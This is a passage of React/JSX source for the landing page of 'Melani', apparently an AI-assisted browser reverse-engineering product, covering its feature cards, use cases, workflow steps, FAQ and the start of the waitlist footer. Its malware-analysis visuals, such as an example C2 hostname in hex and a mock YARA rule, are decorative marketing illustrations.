// Variation A Part 2 — features, workflow, use cases, security, faq, footer

// ───────────────────── FEATURES (BENTO) ─────────────────────
function VAFeatures({ theme, serif, mono }) {
  const { isMobile, isTablet } = useResponsive();
  const featureSpans = [
    isMobile ? { gridColumn: '1 / -1' } : isTablet ? { gridColumn: '1 / -1' } : { gridColumn: 'span 3', gridRow: 'span 2' },
    isMobile ? { gridColumn: '1 / -1' } : isTablet ? { gridColumn: 'span 1' } : { gridColumn: 'span 3' },
    isMobile ? { gridColumn: '1 / -1' } : isTablet ? { gridColumn: 'span 1' } : { gridColumn: 'span 3' },
    isMobile ? { gridColumn: '1 / -1' } : isTablet ? { gridColumn: 'span 1' } : { gridColumn: 'span 2' },
    isMobile ? { gridColumn: '1 / -1' } : isTablet ? { gridColumn: 'span 1' } : { gridColumn: 'span 2' },
    isMobile ? { gridColumn: '1 / -1' } : isTablet ? { gridColumn: '1 / -1' } : { gridColumn: 'span 2' },
  ];
  return (
    <div style={{ padding: isMobile ? '92px 24px' : isTablet ? '110px 32px' : '120px 48px', background: theme.paper, borderTop: `1px solid ${theme.rule}`, borderBottom: `1px solid ${theme.rule}` }}>
      <div style={{ maxWidth: 1280, margin: '0 auto' }}>
        <Reveal><SectionEyebrow mono={mono} theme={theme} num="04" text="FEATURES" /></Reveal>
        <div style={{ display: 'grid', gridTemplateColumns: isTablet ? '1fr' : '1fr 1fr', gap: isTablet ? 24 : 64, alignItems: 'end', marginTop: 20, marginBottom: isMobile ? 36 : 56 }}>
          <Reveal y={28} duration={800}><h2
            style={{
              fontFamily: serif,
              fontSize: 'clamp(40px, 4.2vw, 60px)',
              lineHeight: 1.05,
              letterSpacing: '-0.02em',
              fontWeight: 600,
              margin: 0,
            }}
          >
            The tools analysts expect, organized around <span style={{ color: theme.brand }}>evidence</span>.
          </h2></Reveal>
          <Reveal delay={150} y={20}><p style={{ fontSize: 16, color: theme.inkSoft, margin: 0, lineHeight: 1.6, textWrap: 'pretty' }}>
            Melani keeps the reverse-engineering surface focused: inspect the binary, ask questions,
            verify the evidence, and turn the session into useful notes.
          </p></Reveal>
        </div>

        <div
          style={{
            display: 'grid',
            gridTemplateColumns: isMobile ? '1fr' : isTablet ? 'repeat(2, minmax(0, 1fr))' : 'repeat(6, 1fr)',
            gridAutoRows: isMobile ? 'minmax(220px, auto)' : '220px',
            gap: 18,
          }}
        >
          <Reveal y={24} delay={0} style={featureSpans[0]}>
            <FeatureCard theme={theme} serif={serif} mono={mono} cols={3} rows={2} inner title="Ground-truth citations" blurb="Every claim links to the exact address, section, or bytes that support it. Click any citation to jump into the disassembly and see for yourself.">
              <CitationGraphic theme={theme} mono={mono} />
            </FeatureCard>
          </Reveal>

          <Reveal y={24} delay={100} style={featureSpans[1]}>
            <FeatureCard theme={theme} serif={serif} mono={mono} cols={3} rows={1} inner title="Auto-rename & annotate" blurb="Propose names for functions, locals, and structs grounded in real behavior.">
              <RenameGraphic theme={theme} mono={mono} />
            </FeatureCard>
          </Reveal>

          <Reveal y={24} delay={200} style={featureSpans[2]}>
            <FeatureCard theme={theme} serif={serif} mono={mono} cols={3} rows={1} inner title="YARA assistant" blurb="Draft, refine, and test detection rules against your own corpus.">
              <YaraGraphic theme={theme} mono={mono} />
            </FeatureCard>
          </Reveal>

          <Reveal y={24} delay={280} style={featureSpans[3]}>
            <FeatureCard theme={theme} serif={serif} mono={mono} cols={2} rows={1} inner title="Multi-sample clustering" blurb="Diff related binaries. Find the shared cores of a malware family.">
              <ClusterGraphic theme={theme} />
            </FeatureCard>
          </Reveal>

          <Reveal y={24} delay={360} style={featureSpans[4]}>
            <FeatureCard theme={theme} serif={serif} mono={mono} cols={2} rows={1} inner title="Cloud analysis" blurb="Run disassembly, indexing, and AI analysis in the browser without draining local CPU, memory, or battery.">
              <ModelsGraphic theme={theme} mono={mono} />
            </FeatureCard>
          </Reveal>

          <Reveal y={24} delay={440} style={featureSpans[5]}>
            <FeatureCard theme={theme} serif={serif} mono={mono} cols={2} rows={1} inner title="Browser RE dashboard" blurb="Use disassembly, decompiler output, strings, imports, AI chat, and notes directly in Melani. Exports are optional.">
              <BridgeGraphic theme={theme} mono={mono} />
            </FeatureCard>
          </Reveal>
        </div>

        {/* Roles row */}
        <Reveal y={20} delay={100}>
        <div style={{
          marginTop: isMobile ? 48 : 64,
          display: 'grid',
          gridTemplateColumns: isMobile ? '1fr 1fr' : isTablet ? 'repeat(3, 1fr)' : 'repeat(6, 1fr)',
          gap: 0,
          borderTop: `1px solid ${theme.rule}`,
          borderLeft: `1px solid ${theme.rule}`,
        }}>
          {[
            { role: 'Malware Analysts', desc: 'classify & contain' },
            { role: 'Reverse Engineers', desc: 'rename & annotate' },
            { role: 'Vuln Researchers', desc: 'surface risky logic' },
            { role: 'Threat Intel', desc: 'cluster & attribute' },
            { role: 'CTF Players', desc: 'unblock reversing' },
            { role: 'IR Teams', desc: 'triage unknowns fast' },
          ].map((r) => (
            <div key={r.role} style={{
              padding: isMobile ? '18px 16px' : '22px 20px',
              borderRight: `1px solid ${theme.rule}`,
              borderBottom: `1px solid ${theme.rule}`,
            }}>
              <div style={{ fontFamily: mono, fontSize: 10.5, fontWeight: 600, color: theme.ink, letterSpacing: '0.01em', marginBottom: 4 }}>{r.role}</div>
              <div style={{ fontSize: 12.5, color: theme.muted }}>{r.desc}</div>
            </div>
          ))}
        </div>
        </Reveal>
      </div>
    </div>
  );
}

function FeatureCard({ theme, serif, mono, cols, rows, title, blurb, children, inner }) {
  const { isMobile } = useResponsive();
  const [hover, setHover] = React.useState(false);
  return (
    <div
      onMouseEnter={() => setHover(true)}
      onMouseLeave={() => setHover(false)}
      style={{
        ...(inner ? { height: '100%' } : { gridColumn: `span ${cols}`, gridRow: `span ${rows}` }),
        background: theme.bg,
        border: `1px solid ${theme.rule}`,
        borderRadius: 14,
        padding: isMobile ? 20 : 24,
        display: 'flex',
        flexDirection: 'column',
        justifyContent: 'space-between',
        position: 'relative',
        overflow: 'hidden',
        transition: 'all 0.2s ease',
        transform: hover ? 'translateY(-2px)' : 'translateY(0)',
        boxShadow: hover ? theme.cardHoverShadow : 'none',
        cursor: 'pointer',
      }}
    >
      <div style={{ flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', minHeight: 0 }}>
        {children}
      </div>
      <div style={{ marginTop: 20 }}>
        <div style={{ fontFamily: serif, fontSize: isMobile ? 20 : 22, letterSpacing: '-0.01em', color: theme.ink }}>
          {title}
        </div>
        <div style={{ marginTop: 6, fontSize: 13.5, color: theme.inkSoft, lineHeight: 1.5, textWrap: 'pretty' }}>
          {blurb}
        </div>
      </div>
    </div>
  );
}

// --- Feature graphics ---
function CitationGraphic({ theme, mono }) {
  const { isMobile } = useResponsive();
  const hi = { color: theme.brand, fontWeight: 700 };
  return (
    <div style={{ width: '100%', display: 'grid', gridTemplateColumns: isMobile ? '1fr' : '1fr 1fr', gap: 16, alignSelf: 'stretch', padding: '12px 0' }}>
      <div style={{ fontFamily: mono, fontSize: 11, color: theme.inkSoft, lineHeight: 1.8 }}>
        <div style={{ color: theme.muted, marginBottom: 8 }}>.rodata:0x3c10</div>
        <div style={{ background: theme.paper, border: `1px solid ${theme.rule}`, padding: '8px 10px', borderRadius: 6 }}>
          {/* bytes that spell "cmd.update-status.net:8443" — the port (38 34 34 33 = 8443) is highlighted */}
          <div>63 6d 64 2e 75 70 64 61</div>
          <div>74 65 2d 73 74 61 74 75</div>
          <div>73 2e 6e 65 74 3a <span style={hi}>38 34</span></div>
          <div><span style={hi}>34 33</span> 00 00 00 00 00 00</div>
        </div>
      </div>
      <div style={{ position: 'relative' }}>
        <svg width="100%" height="20" style={{ position: 'absolute', top: 24, left: isMobile ? 0 : -16 }}>
          <path d="M0 10 L 40 10" stroke={theme.brand} strokeWidth="1.2" strokeDasharray="3 2" fill="none" />
          <circle cx="40" cy="10" r="2.5" fill={theme.brand} />
        </svg>
        <div style={{ background: theme.panel, border: `1px solid ${theme.rule}`, padding: 12, borderRadius: 6, marginLeft: isMobile ? 0 : 16, marginTop: isMobile ? 24 : 0 }}>
          <div style={{ fontSize: 10.5, fontFamily: mono, color: theme.brand, letterSpacing: '0.18em', marginBottom: 6, fontWeight: 600 }}>
            CLAIM
          </div>
          <div style={{ fontSize: 12.5, color: theme.ink, lineHeight: 1.5 }}>
            C2 host is hardcoded as <span style={{ fontFamily: mono, fontSize: 11.5, color: theme.brand, fontWeight: 600 }}>cmd.update-status.net</span> on port <span style={{ fontFamily: mono, fontSize: 11.5, color: theme.brand, fontWeight: 600 }}>8443</span>.
          </div>
        </div>
      </div>
    </div>
  );
}

function RenameGraphic({ theme, mono }) {
  return (
    <div style={{ fontFamily: mono, fontSize: 12, lineHeight: 1.8, textAlign: 'center' }}>
      <span style={{ color: theme.muted, textDecoration: 'line-through' }}>sub_401ab0</span>
      <span style={{ color: theme.brand, margin: '0 10px', fontWeight: 700 }}>→</span>
      <span style={{ color: theme.brand, background: theme.brandSoft, padding: '2px 8px', borderRadius: 4, fontWeight: 600 }}>
        decrypt_and_execute
      </span>
    </div>
  );
}

function YaraGraphic({ theme, mono }) {
  return (
    <div style={{ fontFamily: mono, fontSize: 11, color: theme.inkSoft, lineHeight: 1.7, textAlign: 'left', width: '100%' }}>
      <div><span style={{ color: theme.brand, fontWeight: 700 }}>rule</span> <span style={{ color: theme.ink, fontWeight: 600 }}>stager_x64</span> {'{'}</div>
      <div>&nbsp;&nbsp;<span style={{ color: theme.muted }}>strings:</span></div>
      <div>&nbsp;&nbsp;&nbsp;&nbsp;<span style={{ color: theme.brand }}>$a</span> = <span style={{ color: theme.ink }}>{'"cmd.update"'}</span></div>
      <div>&nbsp;&nbsp;&nbsp;&nbsp;<span style={{ color: theme.brand }}>$b</span> = {'{ 48 83 ec 40 ... }'}</div>
      <div>&nbsp;&nbsp;<span style={{ color: theme.muted }}>condition:</span> all of them</div>
      <div>{'}'}</div>
    </div>
  );
}

function ClusterGraphic({ theme }) {
  return (
    <svg viewBox="0 0 180 90" width="100%" style={{ maxWidth: 180 }}>
      <g fill="none" stroke={theme.rule} strokeWidth="1">
        <line x1="60" y1="45" x2="30" y2="20" />
        <line x1="60" y1="45" x2="30" y2="70" />
        <line x1="60" y1="45" x2="120" y2="30" stroke={theme.brand} opacity="0.5" />
        <line x1="60" y1="45" x2="120" y2="60" stroke={theme.brand} opacity="0.5" />
        <line x1="120" y1="30" x2="155" y2="20" />
        <line x1="120" y1="60" x2="155" y2="70" />
      </g>
      {/* center of the cluster — the matched core */}
      <circle cx="60" cy="45" r="8" fill={theme.brand} />
      <circle cx="60" cy="45" r="13" fill="none" stroke={theme.brand} strokeWidth="1" opacity="0.35" />
      {/* confirmed family members */}
      <circle cx="120" cy="30" r="5" fill={theme.brand} opacity="0.75" />
      <circle cx="120" cy="60" r="5" fill={theme.brand} opacity="0.75" />
      {/* unrelated / outliers */}
      <circle cx="30" cy="20" r="4" fill={theme.ink} />
      <circle cx="30" cy="70" r="4" fill={theme.ink} />
      <circle cx="155" cy="20" r="3" fill={theme.ink} opacity="0.55" />
      <circle cx="155" cy="70" r="3" fill={theme.ink} opacity="0.55" />
    </svg>
  );
}

function ModelsGraphic({ theme, mono }) {
  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: 6, width: '100%' }}>
      {['cloud disassembly', 'AI function analysis', 'cited session notes'].map((m, i) => (
        <div
          key={m}
          style={{
            display: 'flex',
            alignItems: 'center',
            gap: 8,
            padding: '6px 10px',
            background: theme.paper,
            border: `1px solid ${theme.rule}`,
            borderRadius: 6,
            fontFamily: mono,
            fontSize: 11,
            color: theme.inkSoft,
          }}
        >
          <div style={{
            width: 6, height: 6, borderRadius: 6,
            background: i === 0 ? theme.brand : theme.rule,
            boxShadow: i === 0 ? `0 0 0 3px ${theme.brandSoft}` : 'none',
          }} />
          {m}
          {i === 0 && <span style={{ marginLeft: 'auto', fontSize: 9.5, color: theme.brand, letterSpacing: '0.18em', fontWeight: 600 }}>ACTIVE</span>}
        </div>
      ))}
    </div>
  );
}

function BridgeGraphic({ theme, mono }) {
  const { isMobile } = useResponsive();
  const arrow = (
    <svg width="26" height="12">
      <path d="M0 6 L 22 6" stroke={theme.brand} strokeWidth="1.2" strokeDasharray="2 2" />
      <path d="M18 2 L 22 6 L 18 10" stroke={theme.brand} strokeWidth="1.2" fill="none" />
    </svg>
  );
  return (
    <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 10, flexWrap: isMobile ? 'wrap' : 'nowrap', fontFamily: mono, fontSize: 11 }}>
      <div style={{ padding: '6px 10px', border: `1px solid ${theme.rule}`, borderRadius: 5, background: theme.paper, color: theme.inkSoft }}>Upload</div>
      {arrow}
      <div style={{ padding: '6px 10px', background: theme.brand, color: '#ffffff', borderRadius: 5, fontWeight: 700, letterSpacing: '0.06em' }}>MELANI</div>
      {arrow}
      <div style={{ padding: '6px 10px', border: `1px solid ${theme.rule}`, borderRadius: 5, background: theme.paper, color: theme.inkSoft }}>Report</div>
    </div>
  );
}

// ───────────────────── USE CASES ─────────────────────
function VAUseCases({ theme, serif, mono }) {
  const { isMobile, isTablet } = useResponsive();
  const roles = [
    { role: 'Malware Analysts', verb: 'classify, extract, and contain', accent: "samples you've never seen before" },
    { role: 'Reverse Engineers', verb: 'rename, annotate, and understand', accent: 'stripped binaries in a fraction of the time' },
    { role: 'Vulnerability Researchers', verb: 'surface risky logic in', accent: 'commercial and firmware targets' },
    { role: 'Threat Intel Teams', verb: 'cluster, diff, and attribute', accent: 'incoming IOCs at scale' },
    { role: 'CTF Players', verb: 'unblock yourself on', accent: 'reversing and pwn challenges' },
    { role: 'Incident Responders', verb: 'triage unknown executables from', accent: 'endpoints during an investigation' },
  ];
  return (
    <div style={{ padding: isMobile ? '92px 24px' : isTablet ? '116px 32px' : '140px 48px', background: theme.paper, borderTop: `1px solid ${theme.rule}`, borderBottom: `1px solid ${theme.rule}` }}>
      <div style={{ maxWidth: 1120, margin: '0 auto' }}>
        <Reveal><SectionEyebrow mono={mono} theme={theme} num="07" text="USE CASES" /></Reveal>
        <Reveal y={28} duration={800}>
        <h2
          style={{
            fontFamily: serif,
            fontSize: 'clamp(40px, 4.4vw, 60px)',
            lineHeight: 1.05,
            letterSpacing: '-0.02em',
            fontWeight: 600,
            margin: `20px 0 ${isMobile ? 40 : 56}px`,
            maxWidth: 800,
          }}
        >
          Built for analysts who need <span style={{ color: theme.brand }}>evidence</span>, not another black box.
        </h2>
        </Reveal>

        <div style={{ display: 'grid', gridTemplateColumns: isTablet ? '1fr' : '1fr 1fr', gap: 0 }}>
          {roles.map((r, i) => (
            <Reveal key={r.role} delay={(i % 2) * 80 + Math.floor(i / 2) * 100} y={20}>
            <div
              style={{
                padding: isMobile ? '24px 0' : '28px 8px',
                borderTop: `1px solid ${theme.rule}`,
                borderBottom: isTablet ? (i === roles.length - 1 ? `1px solid ${theme.rule}` : 'none') : i >= roles.length - 2 ? `1px solid ${theme.rule}` : 'none',
                paddingLeft: isTablet ? 0 : i % 2 === 1 ? 40 : 0,
                paddingRight: isTablet ? 0 : i % 2 === 0 ? 40 : 0,
                borderRight: !isTablet && i % 2 === 0 ? `1px solid ${theme.rule}` : 'none',
              }}
            >
              <div style={{ fontFamily: mono, fontSize: 10.5, letterSpacing: '0.16em', color: theme.muted, marginBottom: 8 }}>
                0{i + 1}
              </div>
              <div style={{ fontFamily: serif, fontSize: isMobile ? 22 : 26, letterSpacing: '-0.01em', color: theme.ink, marginBottom: 6 }}>
                {r.role}
              </div>
              <div style={{ fontSize: 15, color: theme.inkSoft, lineHeight: 1.55, textWrap: 'pretty' }}>
                {r.verb} <span style={{ color: theme.brand, fontWeight: 600 }}>{r.accent}</span>.
              </div>
            </div>
            </Reveal>
          ))}
        </div>
      </div>
    </div>
  );
}

// ───────────────────── WORKFLOW ─────────────────────
function VAWorkflow({ theme, serif, mono }) {
  const { isMobile, isTablet } = useResponsive();
  const steps = [
    {
      n: '01',
      title: 'Upload',
      body: 'Drop a PE, ELF, Mach-O, or raw firmware image. Melani indexes strings, imports, functions, control flow, and decompiler output.',
      code: 'stager_x64.elf · 412 KB · ELF · 64-bit',
    },
    {
      n: '02',
      title: 'Converse',
      body: "Ask in plain English. Melani answers with evidence: addresses, byte patterns, decoded strings, and the current function context.",
      code: "> what's the C2?",
    },
    {
      n: '03',
      title: 'Annotate',
      body: 'Accept renames, save notes, draft detections, and finish the analysis in Melani. Export findings when another tool or report needs them.',
      code: 'session saved · 14 annotations · 3 detections',
    },
  ];
  return (
    <div style={{ padding: isMobile ? '92px 24px' : isTablet ? '116px 32px' : '140px 48px' }}>
      <div style={{ maxWidth: 1120, margin: '0 auto' }}>
        <Reveal><SectionEyebrow mono={mono} theme={theme} num="06" text="WORKFLOW" /></Reveal>
        <Reveal y={28} duration={800}>
        <h2
          style={{
            fontFamily: serif,
            fontSize: 'clamp(40px, 4.4vw, 60px)',
            lineHeight: 1.05,
            letterSpacing: '-0.02em',
            fontWeight: 600,
            margin: `20px 0 ${isMobile ? 40 : 64}px`,
            maxWidth: 780,
          }}
        >
          From unknown binary to <span style={{ color: theme.brand }}>cited report</span> in three steps.
        </h2>
        </Reveal>

        <div style={{ display: 'grid', gridTemplateColumns: isTablet ? '1fr' : 'repeat(3, 1fr)', gap: 0, borderTop: `1px solid ${theme.rule}` }}>
          {steps.map((s, i) => (
            <Reveal key={s.n} delay={i * 120} y={24}>
            <div
              style={{
                padding: isMobile ? '32px 24px' : '48px 40px',
                borderRight: !isTablet && i < 2 ? `1px solid ${theme.rule}` : 'none',
                borderBottom: isTablet && i < steps.length - 1 ? `1px solid ${theme.rule}` : 'none',
                position: 'relative',
                height: '100%',
              }}
            >
              <div style={{ fontFamily: mono, fontSize: 11, letterSpacing: '0.2em', color: theme.accent, marginBottom: 24 }}>
                {s.n}
              </div>
              <div style={{ fontFamily: serif, fontSize: isMobile ? 28 : 34, letterSpacing: '-0.01em', color: theme.ink, marginBottom: 14 }}>
                {s.title}
              </div>
              <div style={{ fontSize: 14.5, color: theme.inkSoft, lineHeight: 1.6, marginBottom: 20, textWrap: 'pretty' }}>
                {s.body}
              </div>
              <div
                style={{
                  fontFamily: mono,
                  fontSize: 11.5,
                  color: theme.muted,
                  background: theme.paper,
                  padding: '8px 12px',
                  border: `1px solid ${theme.rule}`,
                  borderRadius: 6,
                  display: 'inline-block',
                }}
              >
                {s.code}
              </div>
            </div>
            </Reveal>
          ))}
        </div>
      </div>
    </div>
  );
}

// ───────────────────── FAQ ─────────────────────
function VAFaq({ theme, serif, mono }) {
  const { isMobile, isTablet } = useResponsive();
  const faqs = [
    {
      q: 'What formats does Melani support?',
      a: 'PE (.exe/.dll), ELF, Mach-O, APKs, most common firmware containers, shellcode, and memory dumps. Packed samples are unpacked before indexing. If a format is missing, ask — new formats get added quickly.',
    },
    {
      q: 'Is Melani a downloaded reverse-engineering app?',
      a: 'No. Melani is built for browser-based reverse engineering. Upload a sample and analyze it directly in Melani: triage unknowns, inspect functions, generate rename suggestions, draft YARA rules, and prepare cited session notes in the cloud. The heavy work runs off your machine, so you get a faster, more reliable workflow without draining local CPU, memory, or battery. Exports to your existing tools are available when you want them, but they are not required.',
    },
    {
      q: 'Can Melani make mistakes?',
      a: 'Yes — AI models hallucinate, and Melani is no exception. That is why every answer is tied to a citation you can verify: exact addresses, byte ranges, decoded strings, and import evidence. Treat it as a fast, well-read junior analyst you always double-check.',
    },
    {
      q: 'How does model choice work?',
      a: 'Each plan ships with a default model tuned for cost and quality at that tier. Pro and Team users can also connect their own API key — Anthropic, OpenAI, or OpenRouter — and pick the model that fits their workflow and budget.',
    },
    {
      q: 'What happens to my samples?',
      a: 'Samples are isolated per account and never used to train models or shared across workspaces. Team plans support configurable retention windows and access controls for environments that handle sensitive or classified material.',
    },
    {
      q: 'How do teams use it?',
      a: 'Start one analyst on a real sample, review the cited findings, and keep the working notes in the shared Melani workspace. Teams unlock shared workspaces, pooled analysis credits, cluster analysis across sample sets, and volume that scales with caseload.',
    },
  ];
  const [open, setOpen] = React.useState(0);
  return (
    <div style={{ padding: isMobile ? '92px 24px' : isTablet ? '116px 32px' : '140px 48px', background: theme.paper, borderTop: `1px solid ${theme.rule}` }}>
      <div style={{ maxWidth: 960, margin: '0 auto' }}>
        <Reveal><SectionEyebrow mono={mono} theme={theme} num="10" text="QUESTIONS" /></Reveal>
        <Reveal y={28} duration={800}>
        <h2
          style={{
            fontFamily: serif,
            fontSize: 'clamp(40px, 4.4vw, 60px)',
            lineHeight: 1.05,
            letterSpacing: '-0.02em',
            fontWeight: 600,
            margin: `20px 0 ${isMobile ? 40 : 56}px`,
          }}
        >
          Sensible answers to reasonable questions.
        </h2>
        </Reveal>
        <div>
          {faqs.map((f, i) => (
            <div key={i} style={{ borderTop: `1px solid ${theme.rule}`, borderBottom: i === faqs.length - 1 ? `1px solid ${theme.rule}` : 'none' }}>
              <button
                onClick={() => setOpen(open === i ? -1 : i)}
                style={{
                  width: '100%',
                  padding: isMobile ? '20px 0' : '24px 0',
                  background: 'transparent',
                  border: 'none',
                  display: 'flex',
                  alignItems: isMobile ? 'flex-start' : 'center',
                  gap: isMobile ? 16 : 24,
                  cursor: 'pointer',
                  textAlign: 'left',
                  fontFamily: 'inherit',
                }}
              >
                <span style={{ fontFamily: mono, fontSize: 11, letterSpacing: '0.16em', color: theme.muted, minWidth: 24 }}>
                  0{i + 1}
                </span>
                <span style={{ fontFamily: serif, fontSize: isMobile ? 20 : 24, letterSpacing: '-0.01em', color: theme.ink, flex: 1 }}>
                  {f.q}
                </span>
                <span
                  style={{
                    fontFamily: serif,
                    fontSize: 28,
                    color: theme.accent,
                    transition: 'transform 0.3s',
                    transform: open === i ? 'rotate(45deg)' : 'rotate(0deg)',
                    lineHeight: 1,
                  }}
                >
                  +
                </span>
              </button>
              <div
                style={{
                  maxHeight: open === i ? 320 : 0,
                  overflow: 'hidden',
                  transition: 'max-height 0.4s ease, padding 0.3s',
                }}
              >
                <div style={{ padding: isMobile ? '0 0 24px 40px' : '0 0 28px 48px', fontSize: isMobile ? 15 : 16, color: theme.inkSoft, lineHeight: 1.65, textWrap: 'pretty', maxWidth: 680 }}>
                  {f.a}
                </div>
              </div>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}

// ───────────────────── FOOTER / CTA ─────────────────────
function VAFooter({ theme, serif, mono, brandMono }) {
  const { isMobile, isTablet } = useResponsive();
  const [waitlistEmail, setWaitlistEmail] = React.useState('');
  const [waitlistStatus, setWaitlistStatus] = React.useState('');
  const joinWaitlist = (event) => {
    event.preventDefault();
    const value = waitlistEmail.trim();
    if (!value || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value)) {
      setWaitlistStatus('Enter an email to join the waitlist.');
      return;
    }
    try {
      const existing = JSON.parse(localStorage.getItem('melani-waitlist') || '[]');
      localStorage.setItem('melani-waitlist', JSON.stringify([...existing.filter((email) => email !== value), value]));
    } catch (err) {}
    setWaitlistStatus("You're on the waitlist. We'll reach out when early access opens.");
    setWaitlistEmail('');
  };
  return (
    <div id="footer-cta" style={{ padding: isMobile ? '0 16px 28px' : isTablet ? '0 24px 32px' : '0 48px 48px' }}>
      <div
        style={{
          maxWidth: 1280,
          margin: '40px auto 0',
          background: theme.solid,
          color: theme.solidText,
          borderRadius: 20,
          padding: isMobile ? '64px 22px 54px' : isTablet ? '80px 40px 64px' : '96px 64px',
          position: 'relative',
          overflow: 'hidden',
          boxShadow: theme.mode === 'light'
            ? '0 30px 80px -40px rgba(0,0,0,0.35), 0 10px 30px -18px rgba(0,0,0,0.2)'
            : '0 30px 80px -30px rgba(0,0,0,0.85), 0 10px 28px -16px rgba(0,0,0,0.6)',
          border: theme.mode === 'light' ? `1px solid ${theme.rule}` : '1px solid rgba(255,255,255,0.04)',
        }}
      >
        {/* Hex backdrop — faded via radial mask so it reads as texture, not noise */}
        <div
          style={{
            position: 'absolute',
            inset: 0,
            opacity: isMobile ? 0.04 : 0.06,
            fontFamily: mono,
            fontSize: isMobile ? 10 : 12,
            color: theme.solidText,
            lineHeight: 1.9,
            padding: isMobile ? 20 : 40,
            pointerEvents: 'none',
            wordBreak: 'break-all',
            WebkitMaskImage: 'radial-gradient(ellipse at center, transparent 0%, transparent 35%, rgba(0,0,0,0.6) 75%, #000 100%)',
            maskImage: 'radial-gradient(ellipse at center, transparent 0%, transparent 35%, rgba(0,0,0,0.6) 75%, #000 100%)',
          }}
        >
          {'7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 02 00 3e 00 01 00 00 00 b0 12 40 00 00 00 00 00 40 00 00 00 00 00 00 00 d0 41 00 00 00 00 00 00 '.repeat(isMobile ? 12 : 24)}
        </div>

        {/* Soft brand glow — subtle top accent */}
        <div
          style={{
            position: 'absolute',
            top: -120,
            left: '50%',
            transform: 'translateX(-50%)',
            width: 520,
            height: 240,
            background: `radial-gradient(ellipse, ${theme.brandRing} 0%, transparent 70%)`,
            pointerEvents: 'none',
            filter: 'blur(20px)',
          }}
        />

        <div style={{ position: 'relative', zIndex: 2, textAlign: 'center', maxWidth: 960, margin: '0 auto' }}>
          <Reveal y={30} duration={900} as="div">
            <div style={{
              fontFamily: mono, fontSize: 11, letterSpacing: '0.22em',
              color: theme.footerTextSoft, marginBottom: 22,
              display: 'inline-flex', alignItems: 'center', gap: 10,
            }}>
              <span style={{ width: 18, height: 1, background: theme.footerTextMuted }} />
              GET STARTED
              <span style={{ width: 18, height: 1, background: theme.footerTextMuted }} />
            </div>
            <div
              style={{
                fontFamily: serif,
                fontSize: 'clamp(44px, 5.4vw, 76px)',
                lineHeight: 1.02,
                letterSpacing: '-0.025em',
                fontWeight: 600,
                marginBottom: 22,
              }}
            >
              Stop staring at <em style={{
                fontFamily: "'Instrument Serif', 'Times New Roman', serif",
                fontStyle: 'italic',
                fontWeight: 400,
                fontSize: '0.92em',
                color: theme.brand,
                letterSpacing: '-0.01em',
                whiteSpace: 'nowrap',
              }}>sub_401ab0</em>.
              <br />
              Join the waitlist.
            </div>
            <p style={{
              fontSize: isMobile ? 15.5 : 17,
              color: theme.footerText,
              lineHeight: 1.55,
              margin: '0 auto',
              maxWidth: 560,
              textWrap: 'pretty',
            }}>
              Get early access to the browser RE workspace, decompiler-backed analysis, and
              evidence-linked AI notes as soon as invites open.
            </p>
          </Reveal>

          {/* ─── ROW 2: CTAs + Trust row ─── */}
          <Reveal y={20} duration={800} delay={180} as="div">
            <div style={{ display: 'flex', gap: 14, justifyContent: 'center', marginTop: 44, flexWrap: 'wrap', alignItems: 'center' }}>
              {/* Primary — bright paper on dark, max contrast */}
              <input
                type="email"
                value={waitlistEmail}
                onChange={(event) => {
                  setWaitlistEmail(event.target.value);
                  if (waitlistStatus) setWaitlistStatus('');
                }}
                placeholder="you@company.com"
                aria-label="Email address"
                style={{
                  flex: '1 1 280px',
                  minWidth: isMobile ? '100%' : 280,
                  maxWidth: isMobile ? '100%' : 360,
                  padding: '16px 18px',
                  borderRadius: 999,
                  background: 'rgba(255,255,255,0.08)',
                  color: theme.solidText,
                  border: `1px solid ${theme.footerGhostBorder}`,
                  fontSize: 15,
                  fontFamily: 'inherit',
                  outline: 'none',
                }}
                onFocus={(e) => {
                  e.currentTarget.style.borderColor = theme.brand;
                  e.currentTarget.style.boxShadow = `0 0 0 4px ${theme.brandRing}`;
                }}
                onBlur={(e) => {
                  e.currentTarget.style.borderColor = theme.footerGhostBorder;
                  e.currentTarget.style.boxShadow = 'none';
                }}
              />
              <button
                onClick={joinWaitlist}
                style={{
                  padding: '16px 30px',
                  borderRadius: 999,
                  background: theme.paper,
                  color: theme.ink,
                  border: 'none',
                  fontSize: 15,
                  fontWeight: 600,
                  cursor: 'pointer',
                  fontFamily: 'inherit',
                  display: 'inline-flex',
                  alignItems: 'center',
                  gap: 9,
                  letterSpacing: '-0.01em',
                  transition: 'transform .18s ease, box-shadow .18s ease',
                }}
                onMouseEnter={(e) => {
                  e.currentTarget.style.transform = 'translateY(-2px)';
                  e.currentTarget.style.boxShadow = '0 16px 40px -12px rgba(0,0,0,0.55)';
                }}
                onMouseLeave={(e) => {
                  e.currentTarget.style.transform = 'translateY(0)';
                  e.currentTarget.style.boxShadow = 'none';
                }}
              >
                Join waitlist
                <svg width="14" height="14" viewBox="0 0 14 14" fill="none">
                  <path d="M3 7h8m0 0L7.5 3.5M11 7l-3.5 3.5" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/>
                </svg>
              </button>

              <span style={{ color: theme.footerTextMuted, fontSize: 15, fontStyle: 'italic', fontFamily: serif }}>or</span>

              <button
                onClick={() => scrollToId('workspace')}
                style={{
                  padding: '16px 26px',
                  borderRadius: 999,
                  background: 'transparent',
                  color: theme.solidText,
                  border: `1px solid ${theme.footerGhostBorder}`,
                  fontSize: 15,
                  fontWeight: 500,
                  cursor: 'pointer',
                  fontFamily: 'inherit',
                  letterSpacing: '-0.01em',
                  transition: 'background .15s ease, border-color .15s ease',
                }}
                onMouseEnter={(e) => {
                  e.currentTarget.style.background = theme.footerGhostBgHover;
                  e.currentTarget.style.borderColor = theme.footerGhostBorderHover;
                }}
                onMouseLeave={(e) => {
                  e.currentTarget.style.background = 'transparent';
                  e.currentTarget.style.borderColor = theme.footerGhostBorder;
                }}
              >
                See live workspace
              </button>
            </div>

            <div style={{ marginTop: 14, minHeight: 22, color: theme.footerText, fontSize: 14 }}>
              {waitlistStatus || 'Join the private beta list. No spam, just access updates.'}
            </div>

            <div style={{
              marginTop: 26,
              display: 'flex',
              gap: 24,
              justifyContent: 'center',
              flexWrap: 'wrap',
              fontFamily: mono,
              fontSize: 11,
              letterSpacing: '0.12em',
